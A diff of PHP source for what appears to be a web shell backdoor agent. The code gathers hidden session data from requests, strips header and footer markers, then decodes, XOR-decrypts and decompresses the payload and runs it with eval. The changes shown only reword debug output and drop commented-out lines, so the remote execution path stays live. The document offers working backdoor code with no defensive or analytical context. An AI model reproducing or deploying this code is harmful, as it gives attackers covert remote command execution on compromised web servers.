@@ -54,7 +54,7 @@ if ($q && $m) {
    $p='';
    for($z=1;$z<count($m[1]);$z++) $p=$p.$q[$m[2][$z]];
 
-   print("<$kh${kf}DEBUG>HEADER $h in $p = ".strpos($p,$h)."?</$kh${kf}DEBUG>");
+   print("<$kh${kf}DEBUG>HEADER $h ?</$kh${kf}DEBUG>");
 
    // The header corresponds, initialize a SESSION START
    if(strpos($p,$h)===0){
@@ -63,7 +63,7 @@ if ($q && $m) {
 		$p=substr($p,3);
    }
 
-   print("<$kh${kf}DEBUG>ID IN SESSION? ". var_dump($s) ."</$kh${kf}DEBUG>");
+   print("<$kh${kf}DEBUG>ID $i IN SESSION?</$kh${kf}DEBUG>");
    // If there is the session, could be SESSION MIDDLE or SESSION END
    if(array_key_exists($i,$s)) {
 
@@ -73,15 +73,12 @@ if ($q && $m) {
 		
 		// Check if is SESSION END
 		$e=strpos($s[$i],$f);
-		print("<$kh${kf}DEBUG>FOOTER $f in $s[$i]? $e</$kh${kf}DEBUG>");
+		print("<$kh${kf}DEBUG>FOOTER $f ?</$kh${kf}DEBUG>");
 		
 		if($e){
 			$b64 = preg_replace(array("/_/","/-/"),array("/","+"),substr($s[$i],0,$e));
 			
-			print("<$kh${kf}DEBUG>OK FOOTER!</$kh${kf}DEBUG>");
-			//var_dump(gzuncompress(x(base64_decode($b64),$k)));
-			//eval(gzuncompress(x(base64_decode($b64),$k)));
-			//print("");
+			print("<$kh${kf}DEBUG>OK FOOTER! FINAL: $s[$i]</$kh${kf}DEBUG>");
 			
 			ob_start();
 			eval(gzuncompress(x(base64_decode($b64),$k)));
